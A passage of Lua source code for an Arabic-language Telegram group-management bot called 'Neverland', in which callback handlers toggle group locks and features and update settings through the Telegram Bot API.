sendin1(Chat_id,msg_idd,data.sender_user_id_)
end
elseif Text and Text:match('(.*)/lock_edit') then
if tonumber(Text:match('(.*)/lock_edit')) == tonumber(data.sender_user_id_) then
database:set(bot_id.."Neverland:Lock:edit"..data.chat_id_,true) 
sendin1(Chat_id,msg_idd,data.sender_user_id_)
end
elseif Text and Text:match('(.*)/lock_link') then
if tonumber(Text:match('(.*)/lock_link')) == tonumber(data.sender_user_id_) then
database:set(bot_id.."Neverland:Lock:Link"..data.chat_id_,"del")  
sendin1(Chat_id,msg_idd,data.sender_user_id_)
end
elseif Text and Text:match('(.*)/lock_username') then
if tonumber(Text:match('(.*)/lock_username')) == tonumber(data.sender_user_id_) then
database:set(bot_id.."Neverland:Lock:User:Name"..data.chat_id_,"del")  
sendin1(Chat_id,msg_idd,data.sender_user_id_)
end
elseif Text and Text:match('(.*)/lock_tag') then
if tonumber(Text:match('(.*)/lock_tag')) == tonumber(data.sender_user_id_) then
database:set(bot_id.."Neverland:Lock:hashtak"..data.chat_id_,"del")  
sendin1(Chat_id,msg_idd,data.sender_user_id_)
end
elseif Text and Text:match('(.*)/mute_sticker') then
if tonumber(Text:match('(.*)/mute_sticker')) == tonumber(data.sender_user_id_) then
database:set(bot_id.."Neverland:Lock:Sticker"..data.chat_id_,"del")  
sendin1(Chat_id,msg_idd,data.sender_user_id_)
end
elseif Text and Text:match('(.*)/mute_gif') then
if tonumber(Text:match('(.*)/mute_gif')) == tonumber(data.sender_user_id_) then
database:set(bot_id.."Neverland:Lock:Animation"..data.chat_id_,"del")  
sendin1(Chat_id,msg_idd,data.sender_user_id_)
end
elseif Text and Text:match('(.*)/mute_video') then
if tonumber(Text:match('(.*)/mute_video')) == tonumber(data.sender_user_id_) then
database:set(bot_id.."Neverland:Lock:Video"..data.chat_id_,"del")  
sendin1(Chat_id,msg_idd,data.sender_user_id_)
end
elseif Text and Text:match('(.*)/mute_photo') then
if tonumber(Text:match('(.*)/mute_photo')) == tonumber(data.sender_user_id_) then
database:set(bot_id.."Neverland:Lock:Photo"..data.chat_id_,"del")  
sendin(Chat_id,msg_idd,data.sender_user_id_)
end
elseif Text and Text:match('(.*)/mute_voice') then
if tonumber(Text:match('(.*)/mute_voice')) == tonumber(data.sender_user_id_) then
database:set(bot_id.."Neverland:Lock:vico"..data.chat_id_,"del")  
sendin(Chat_id,msg_idd,data.sender_user_id_)
end
elseif Text and Text:match('(.*)/mute_audio') then
if tonumber(Text:match('(.*)/mute_audio')) == tonumber(data.sender_user_id_) then
database:set(bot_id.."Neverland:Lock:Audio"..data.chat_id_,"del")  
sendin(Chat_id,msg_idd,data.sender_user_id_)
end
elseif Text and Text:match('(.*)/mute_forward') then
if tonumber(Text:match('(.*)/mute_forward')) == tonumber(data.sender_user_id_) then
database:set(bot_id.."Neverland:Lock:forward"..data.chat_id_,"del")  
sendin(Chat_id,msg_idd,data.sender_user_id_)
end
elseif Text and Text:match('(.*)/mute_document') then
if tonumber(Text:match('(.*)/mute_document')) == tonumber(data.sender_user_id_) then
database:set(bot_id.."Neverland:Lock:Document"..data.chat_id_,"del")  
sendin(Chat_id,msg_idd,data.sender_user_id_)
end
elseif Text and Text:match('(.*)/mute_contact') then
if tonumber(Text:match('(.*)/mute_contact')) == tonumber(data.sender_user_id_) then
database:set(bot_id.."Neverland:Lock:Contact"..data.chat_id_,"del")  
sendin(Chat_id,msg_idd,data.sender_user_id_)
end
elseif Text and Text:match('(.*)/lock_spam') then
if tonumber(Text:match('(.*)/lock_spam')) == tonumber(data.sender_user_id_) then
database:set(bot_id.."Neverland:Lock:Spam"..data.chat_id_,"del")  
sendin(Chat_id,msg_idd,data.sender_user_id_)
end
elseif Text and Text:match('(.*)/lock_flood') then
if tonumber(Text:match('(.*)/lock_flood')) == tonumber(data.sender_user_id_) then
database:hset(bot_id.."Neverland:flooding:settings:"..data.chat_id_ ,"flood","del")  
sendin(Chat_id,msg_idd,data.sender_user_id_)
end
elseif Text and Text:match('(.*)/mute_inline') then
if tonumber(Text:match('(.*)/mute_inline')) == tonumber(data.sender_user_id_) then
database:set(bot_id.."Neverland:Lock:Inlen"..data.chat_id_,"del")  
sendin(Chat_id,msg_idd,data.sender_user_id_)
end
end
if Text and Text:match('(.*)/unmute_text') then
if tonumber(Text:match('(.*)/unmute_text')) == tonumber(data.sender_user_id_) then
database:del(bot_id.."Neverland:Lock:text"..data.chat_id_) 
sendin1(Chat_id,msg_idd,data.sender_user_id_)
end
elseif Text and Text:match('(.*)/unlock_bots') then
if tonumber(Text:match('(.*)/unlock_bots')) == tonumber(data.sender_user_id_) then
database:del(bot_id.."Neverland:Lock:Bot:kick"..data.chat_id_)  
sendin1(Chat_id,msg_idd,data.sender_user_id_)
end
elseif Text and Text:match('(.*)/unmute_tgservice') then
if tonumber(Text:match('(.*)/unmute_tgservice')) == tonumber(data.sender_user_id_) then
database:del(bot_id.."Neverland:Lock:tagservr"..data.chat_id_)  
sendin1(Chat_id,msg_idd,data.sender_user_id_)
end
elseif Text and Text:match('(.*)/unlock_edit') then
if tonumber(Text:match('(.*)/unlock_edit')) == tonumber(data.sender_user_id_) then
database:del(bot_id.."Neverland:Lock:edit"..data.chat_id_) 
sendin1(Chat_id,msg_idd,data.sender_user_id_)
end
elseif Text and Text:match('(.*)/unlock_link') then
if tonumber(Text:match('(.*)/unlock_link')) == tonumber(data.sender_user_id_) then
database:del(bot_id.."Neverland:Lock:Link"..data.chat_id_)  
sendin1(Chat_id,msg_idd,data.sender_user_id_)
end
elseif Text and Text:match('(.*)/unlock_username') then
if tonumber(Text:match('(.*)/unlock_username')) == tonumber(data.sender_user_id_) then
database:del(bot_id.."Neverland:Lock:User:Name"..data.chat_id_)  
sendin1(Chat_id,msg_idd,data.sender_user_id_)
end
elseif Text and Text:match('(.*)/unlock_tag') then
if tonumber(Text:match('(.*)/unlock_tag')) == tonumber(data.sender_user_id_) then
database:del(bot_id.."Neverland:Lock:hashtak"..data.chat_id_)  
sendin1(Chat_id,msg_idd,data.sender_user_id_)
end
elseif Text and Text:match('(.*)/unmute_sticker') then
if tonumber(Text:match('(.*)/unmute_sticker')) == tonumber(data.sender_user_id_) then
database:del(bot_id.."Neverland:Lock:Sticker"..data.chat_id_)  
sendin1(Chat_id,msg_idd,data.sender_user_id_)
end
elseif Text and Text:match('(.*)/unmute_gif') then
if tonumber(Text:match('(.*)/unmute_gif')) == tonumber(data.sender_user_id_) then
database:del(bot_id.."Neverland:Lock:Animation"..data.chat_id_)  
sendin1(Chat_id,msg_idd,data.sender_user_id_)
end
elseif Text and Text:match('(.*)/unmute_video') then
if tonumber(Text:match('(.*)/unmute_video')) == tonumber(data.sender_user_id_) then
database:del(bot_id.."Neverland:Lock:Video"..data.chat_id_)  
sendin1(Chat_id,msg_idd,data.sender_user_id_)
end
elseif Text and Text:match('(.*)/unmute_photo') then
if tonumber(Text:match('(.*)/unmute_photo')) == tonumber(data.sender_user_id_) then
database:del(bot_id.."Neverland:Lock:Photo"..data.chat_id_)  
sendin(Chat_id,msg_idd,data.sender_user_id_)
end
elseif Text and Text:match('(.*)/unmute_voice') then
if tonumber(Text:match('(.*)/unmute_voice')) == tonumber(data.sender_user_id_) then
database:del(bot_id.."Neverland:Lock:vico"..data.chat_id_)  
sendin(Chat_id,msg_idd,data.sender_user_id_)
end
elseif Text and Text:match('(.*)/unmute_audio') then
if tonumber(Text:match('(.*)/unmute_audio')) == tonumber(data.sender_user_id_) then
database:del(bot_id.."Neverland:Lock:Audio"..data.chat_id_)  
sendin(Chat_id,msg_idd,data.sender_user_id_)
end
elseif Text and Text:match('(.*)/unmute_forward') then
if tonumber(Text:match('(.*)/unmute_forward')) == tonumber(data.sender_user_id_) then
database:del(bot_id.."Neverland:Lock:forward"..data.chat_id_)  
sendin(Chat_id,msg_idd,data.sender_user_id_)
end
elseif Text and Text:match('(.*)/unmute_document') then
if tonumber(Text:match('(.*)/unmute_document')) == tonumber(data.sender_user_id_) then
database:del(bot_id.."Neverland:Lock:Document"..data.chat_id_)  
sendin(Chat_id,msg_idd,data.sender_user_id_)
end
elseif Text and Text:match('(.*)/unmute_contact') then
if tonumber(Text:match('(.*)/unmute_contact')) == tonumber(data.sender_user_id_) then
database:del(bot_id.."Neverland:Lock:Contact"..data.chat_id_)  
sendin(Chat_id,msg_idd,data.sender_user_id_)
end
elseif Text and Text:match('(.*)/unlock_spam') then
if tonumber(Text:match('(.*)/unlock_spam')) == tonumber(data.sender_user_id_) then
database:del(bot_id.."Neverland:Lock:Spam"..data.chat_id_)  
sendin(Chat_id,msg_idd,data.sender_user_id_)
end
elseif Text and Text:match('(.*)/unlock_flood') then
if tonumber(Text:match('(.*)/unlock_flood')) == tonumber(data.sender_user_id_) then
database:hdel(bot_id.."Neverland:flooding:settings:"..data.chat_id_ ,"flood")  
sendin(Chat_id,msg_idd,data.sender_user_id_)
end
elseif Text and Text:match('(.*)/unmute_inline') then
if tonumber(Text:match('(.*)/unmute_inline')) == tonumber(data.sender_user_id_) then
database:del(bot_id.."Neverland:Lock:Inlen"..data.chat_id_)  
sendin(Chat_id,msg_idd,data.sender_user_id_)
end
elseif Text and Text:match('(.*)/homelocks1') then
if tonumber(Text:match('(.*)/homelocks1')) == tonumber(data.sender_user_id_) then
sendin(Chat_id,msg_idd,data.sender_user_id_)
end
elseif Text and Text:match('(.*)/homelocks') then
if tonumber(Text:match('(.*)/homelocks')) == tonumber(data.sender_user_id_) then
sendin1(Chat_id,msg_idd,data.sender_user_id_)
end
end


if Text and Text:match('(.*)/Ban:Cheking') and Constructor(data) then
if tonumber(Text:match('(.*)/Ban:Cheking')) == tonumber(data.sender_user_id_) then
database:del(bot_id.."Ban:Cheking"..data.chat_id_)
local Textedit = '✦┇تم تفعيل الطرد '
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = 'القائمة الرئيسيه', callback_data=data.sender_user_id_.."/homeaddwd"},
},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Textedit)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard))  

end
elseif Text and Text:match('(.*)/Add:Group:Cheking') and Constructor(data) then
if tonumber(Text:match('(.*)/Add:Group:Cheking')) == tonumber(data.sender_user_id_) then
database:del(bot_id.."Add:Group:Cheking"..data.chat_id_)
local Textedit = '✦┇تم تفعيل الرفع '
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = 'القائمة الرئيسيه', callback_data=data.sender_user_id_.."/homeaddwd"},
},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Textedit)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard))  

end
elseif Text and Text:match('(.*)/Neverland:Link_Group') then
if tonumber(Text:match('(.*)/Neverland:Link_Group')) == tonumber(data.sender_user_id_) then
database:set(bot_id.."Neverland:Link_Group"..data.chat_id_,true) 
local Textedit = '✦┇تم تفعيل جلب الرابط '
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = 'القائمة الرئيسيه', callback_data=data.sender_user_id_.."/homeaddwd"},
},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Textedit)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard))  

end
elseif Text and Text:match('(.*)/Neverland:Chek:Welcome') then
if tonumber(Text:match('(.*)/Neverland:Chek:Welcome')) == tonumber(data.sender_user_id_) then
database:set(bot_id.."Neverland:Chek:Welcome"..data.chat_id_,true) 
local Textedit = '✦┇تم تفعيل الترحيب '
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = 'القائمة الرئيسيه', callback_data=data.sender_user_id_.."/homeaddwd"},
},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Textedit)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard))  

end
elseif Text and Text:match('(.*)/Neverland:Reply:Manager') and Owner(data) then
if tonumber(Text:match('(.*)/Neverland:Reply:Manager')) == tonumber(data.sender_user_id_) then
database:del(bot_id.."Neverland:Reply:Manager"..data.chat_id_)  
local Textedit = '✦┇تم تفعيل ردود المدير '
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = 'القائمة الرئيسيه', callback_data=data.sender_user_id_.."/homeaddwd"},
},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Textedit)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard))  

end
elseif Text and Text:match('(.*)/Neverland:Reply:Sudo') and Owner(data) then
if tonumber(Text:match('(.*)/Neverland:Reply:Sudo')) == tonumber(data.sender_user_id_) then
database:del(bot_id.."Neverland:Reply:Sudo"..data.chat_id_)  
local Textedit = '✦┇تم تفعيل ردود المطور '
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = 'القائمة الرئيسيه', callback_data=data.sender_user_id_.."/homeaddwd"},
},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Textedit)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard))  

end
elseif Text and Text:match('(.*)/Neverland:Kick:Me') then
if tonumber(Text:match('(.*)/Neverland:Kick:Me')) == tonumber(data.sender_user_id_) then
database:del(bot_id.."Neverland:Kick:Me"..data.chat_id_)  
local Textedit = '✦┇تم تفعيل اطردني '
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = 'القائمة الرئيسيه', callback_data=data.sender_user_id_.."/homeaddwd"},
},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Textedit)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard))  

end
elseif Text and Text:match('(.*)/Neverland:Left:Bot') and DevNeverland(data) then  
if tonumber(Text:match('(.*)/Neverland:Left:Bot')) == tonumber(data.sender_user_id_) then
database:del(bot_id.."Neverland:Left:Bot"..data.chat_id_)  
local Textedit = '✦┇تم تفعيل المغادره '
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = 'القائمة الرئيسيه', callback_data=data.sender_user_id_.."/homeaddwd"},
},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Textedit)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard))  

end
elseif Text and Text:match('(.*)/Neverland:Status:Bc') and DevNeverland(data) then  
if tonumber(Text:match('(.*)/Neverland:Status:Bc')) == tonumber(data.sender_user_id_) then
database:del(bot_id.."Neverland:Status:Bc") 
local Textedit = '✦┇تم تفعيل الاذاعه '
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = 'القائمة الرئيسيه', callback_data=data.sender_user_id_.."/homeaddwd"},
},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Textedit)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard))  

end
elseif Text and Text:match('(.*)/Neverland:Fun_Bots') and Owner(data) then    
if tonumber(Text:match('(.*)/Neverland:Fun_Bots')) == tonumber(data.sender_user_id_) then
database:del(bot_id.."Neverland:Fun_Bots"..data.chat_id_)
local Textedit = '✦┇تم تفعيل اوامر التحشيش '
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = 'القائمة الرئيسيه', callback_data=data.sender_user_id_.."/homeaddwd"},
},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Textedit)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard))  

end
elseif Text and Text:match('(.*)/Neverland:Lock:ID:Bot') and Owner(data) then  
if tonumber(Text:match('(.*)/Neverland:Lock:ID:Bot')) == tonumber(data.sender_user_id_) then
database:del(bot_id..'Neverland:Lock:ID:Bot'..data.chat_id_) 
local Textedit = '✦┇تم تفعيل الايدي '
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = 'القائمة الرئيسيه', callback_data=data.sender_user_id_.."/homeaddwd"},
},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Textedit)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard))  

end
elseif Text and Text:match('(.*)/Neverland:Lock:ID:Bot:Photo') and Owner(data) then  
if tonumber(Text:match('(.*)/Neverland:Lock:ID:Bot:Photo')) == tonumber(data.sender_user_id_) then
database:del(bot_id..'Neverland:Lock:ID:Bot:Photo'..data.chat_id_) 
local Textedit = '✦┇تم تفعيل الايدي بالصوره '
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = 'القائمة الرئيسيه', callback_data=data.sender_user_id_.."/homeaddwd"},
},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Textedit)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard))  

end
elseif Text and Text:match('(.*)/Lock:delmsg') and BasicConstructor(data) then   
if tonumber(Text:match('(.*)/Lock:delmsg')) == tonumber(data.sender_user_id_) then
database:set(bot_id..'Lock:delmsg'..data.chat_id_,true) 
local Textedit = '✦┇تم تفعيل التنظيف '
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = 'القائمة الرئيسيه', callback_data=data.sender_user_id_.."/homeaddwd"},
},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Textedit)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard))  

end
elseif Text and Text:match('(.*)/Neverland:Lock:Games') and Owner(data) then  
if tonumber(Text:match('(.*)/Neverland:Lock:Games')) == tonumber(data.sender_user_id_) then
database:set(bot_id.."Neverland:Lock:Games"..data.chat_id_,true) 
local Textedit = '✦┇تم تفعيل الالعاب '
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = 'القائمة الرئيسيه', callback_data=data.sender_user_id_.."/homeaddwd"},
},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Textedit)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard))  

end
elseif Text and Text:match('(.*)/Cick:all') and Constructor(data) then  
if tonumber(Text:match('(.*)/Cick:all')) == tonumber(data.sender_user_id_) then
database:del(bot_id..'Cick:all'..data.chat_id_)  
local Textedit = '✦┇تم تفعيل التاك للكل '
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = 'القائمة الرئيسيه', callback_data=data.sender_user_id_.."/homeaddwd"},
},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Textedit)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard))  

end
elseif Text and Text:match('(.*)/Neverland:zhrf_Bots') and Owner(data) then
if tonumber(Text:match('(.*)/Neverland:zhrf_Bots')) == tonumber(data.sender_user_id_) then
database:set(bot_id.."Neverland:zhrf_Bots"..data.chat_id_,"open")
local Textedit = '✦┇تم تفعيل الزخرفه '
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = 'القائمة الرئيسيه', callback_data=data.sender_user_id_.."/homeaddwd"},
},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Textedit)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard))  

end
elseif Text and Text:match('(.*)/Neverland:brj_Bots') and Owner(data) then
if tonumber(Text:match('(.*)/Neverland:brj_Bots')) == tonumber(data.sender_user_id_) then
database:set(bot_id.."Neverland:brj_Bots"..data.chat_id_,"open")
local Textedit = '✦┇تم تفعيل الابراج '
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = 'القائمة الرئيسيه', callback_data=data.sender_user_id_.."/homeaddwd"},
},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Textedit)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard))  

end
elseif Text and Text:match('(.*)/Neverland:age_Bots') and Owner(data) then
if tonumber(Text:match('(.*)/Neverland:age_Bots')) == tonumber(data.sender_user_id_) then
database:set(bot_id.."Neverland:age_Bots"..data.chat_id_,"open")
local Textedit = '✦┇تم تفعيل حساب العمر '
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = 'القائمة الرئيسيه', callback_data=data.sender_user_id_.."/homeaddwd"},
},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Textedit)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard))  

end
elseif Text and Text:match('(.*)/Neverland:movie_bot') and Owner(data) then
if tonumber(Text:match('(.*)/Neverland:movie_bot')) == tonumber(data.sender_user_id_) then
database:set(bot_id.."Neverland:movie_bot"..data.chat_id_,"open")
local Textedit = '✦┇تم تفعيل الافلام '
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = 'القائمة الرئيسيه', callback_data=data.sender_user_id_.."/homeaddwd"},
},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Textedit)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard))  

end
elseif Text and Text:match('(.*)/Neverland:Free:Add:Bots') and DevNeverland(data) then  
if tonumber(Text:match('(.*)/Neverland:Free:Add:Bots')) == tonumber(data.sender_user_id_) then
database:del(bot_id..'Neverland:Free:Add:Bots') 
local Textedit = '✦┇تم تفعيل البوت الخدمي '
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = 'القائمة الرئيسيه', callback_data=data.sender_user_id_.."/homeaddwd"},
},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Textedit)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard))  

end
elseif Text and Text:match('(.*)/Neverland:insta_bot') and Owner(data) then
if tonumber(Text:match('(.*)/Neverland:insta_bot')) == tonumber(data.sender_user_id_) then
database:set(bot_id.."Neverland:insta_bot"..data.chat_id_,"open")
local Textedit = '✦┇تم تفعيل الانستا '
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = 'القائمة الرئيسيه', callback_data=data.sender_user_id_.."/homeaddwd"},
},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Textedit)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard))  

end
end
if Text and Text:match('(.*)/unBan:Cheking') and Constructor(data) then
if tonumber(Text:match('(.*)/unBan:Cheking')) == tonumber(data.sender_user_id_) then
database:set(bot_id.."Ban:Cheking"..data.chat_id_,"true")
local Textedit = '*✦┇تم تعطيل الطرد*'
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = 'القائمة الرئيسيه', callback_data=data.sender_user_id_.."/homeaddwd"},
},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Textedit)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard))  

end
elseif Text and Text:match('(.*)/unAdd:Group:Cheking') and Constructor(data) then
if tonumber(Text:match('(.*)/unAdd:Group:Cheking')) == tonumber(data.sender_user_id_) then
database:set(bot_id.."Add:Group:Cheking"..data.chat_id_,"true")
local Textedit = '*✦┇تم تعطيل الرفع* '
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = 'القائمة الرئيسيه', callback_data=data.sender_user_id_.."/homeaddwd"},
},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Textedit)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard))  

end
elseif Text and Text:match('(.*)/unNeverland:Link_Group') then
if tonumber(Text:match('(.*)/unNeverland:Link_Group')) == tonumber(data.sender_user_id_) then
database:del(bot_id.."Neverland:Link_Group"..data.chat_id_) 
local Textedit = '✦┇تم تعطيل جلب الرابط '
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = 'القائمة الرئيسيه', callback_data=data.sender_user_id_.."/homeaddwd"},
},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Textedit)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard))  

end
elseif Text and Text:match('(.*)/unNeverland:Chek:Welcome') then
if tonumber(Text:match('(.*)/unNeverland:Chek:Welcome')) == tonumber(data.sender_user_id_) then
database:del(bot_id.."Neverland:Chek:Welcome"..data.chat_id_) 
local Textedit = '✦┇تم تعطيل الترحيب '
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = 'القائمة الرئيسيه', callback_data=data.sender_user_id_.."/homeaddwd"},
},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Textedit)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard))  

end
elseif Text and Text:match('(.*)/unNeverland:Reply:Manager') and Owner(data) then
if tonumber(Text:match('(.*)/unNeverland:Reply:Manager')) == tonumber(data.sender_user_id_) then
database:set(bot_id.."Neverland:Reply:Manager"..data.chat_id_,true)  
local Textedit = '✦┇تم تعطيل ردود المدير '
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = 'القائمة الرئيسيه', callback_data=data.sender_user_id_.."/homeaddwd"},
},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Textedit)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard))  

end
elseif Text and Text:match('(.*)/unNeverland:Reply:Sudo') and Owner(data) then
if tonumber(Text:match('(.*)/unNeverland:Reply:Sudo')) == tonumber(data.sender_user_id_) then
database:set(bot_id.."Neverland:Reply:Sudo"..data.chat_id_,true)   
local Textedit = '✦┇تم تعطيل ردود المطور '
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = 'القائمة الرئيسيه', callback_data=data.sender_user_id_.."/homeaddwd"},
},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Textedit)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard))  

end
elseif Text and Text:match('(.*)/unNeverland:Kick:Me') then
if tonumber(Text:match('(.*)/unNeverland:Kick:Me')) == tonumber(data.sender_user_id_) then
database:set(bot_id.."Neverland:Kick:Me"..data.chat_id_,true)  
local Textedit = '✦┇تم تعطيل اطردني '
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = 'القائمة الرئيسيه', callback_data=data.sender_user_id_.."/homeaddwd"},
},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Textedit)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard))  

end
elseif Text and Text:match('(.*)/unNeverland:Left:Bot') and DevNeverland(data) then  
if tonumber(Text:match('(.*)/unNeverland:Left:Bot')) == tonumber(data.sender_user_id_) then
database:set(bot_id.."Neverland:Left:Bot"..data.chat_id_,true)   
local Textedit = '✦┇تم تعطيل المغادره '
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = 'القائمة الرئيسيه', callback_data=data.sender_user_id_.."/homeaddwd"},
},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Textedit)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard))  

end
elseif Text and Text:match('(.*)/unNeverland:Status:Bc') and DevNeverland(data) then  
if tonumber(Text:match('(.*)/unNeverland:Status:Bc')) == tonumber(data.sender_user_id_) then
database:set(bot_id.."Neverland:Status:Bc",true) 
local Textedit = '✦┇تم تعطيل الاذاعه '
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = 'القائمة الرئيسيه', callback_data=data.sender_user_id_.."/homeaddwd"},
},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Textedit)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard))  

end
elseif Text and Text:match('(.*)/unNeverland:Fun_Bots') and Owner(data) then    
if tonumber(Text:match('(.*)/unNeverland:Fun_Bots')) == tonumber(data.sender_user_id_) then
database:set(bot_id.."Neverland:Fun_Bots"..data.chat_id_,"true")
local Textedit = '✦┇تم تعطيل اوامر التحشيش '
